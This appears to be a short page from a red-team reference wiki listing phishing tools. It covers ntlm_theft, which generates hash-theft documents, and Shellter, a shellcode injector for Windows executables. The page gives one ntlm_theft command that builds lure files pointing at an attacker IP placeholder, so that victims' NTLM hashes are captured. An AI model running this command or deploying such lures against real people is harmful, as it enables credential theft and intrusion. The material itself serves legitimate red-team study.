| 🏠 [Home](../../redteam.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|-----------------------------|----------------------|-------------------------|

* [Tools](../../red_team/phishing/tools.md)
    * [ntlm_theft](#ntlm_theft)
    * [Shellter Project](#shellter-project)

# Tools

## ntlm_theft

[ntlm_theft](https://github.com/Greenwolf/ntlm_theft) is an open-source
tool that generates 21 types of hash theft documents.

These can be used for phishing when the target allows SMB traffic
outside their network or if you are already inside the internal network.

    python3 ntlm_theft.py -g htm -s <attacker_ip> -f <out_file>

## Shellter Project

[Shellter](https://www.shellterproject.com/) is a dynamic shellcode
injection tool, and the first truly dynamic PE infector ever created. It
can be used in order to inject shellcode into native Windows
applications.
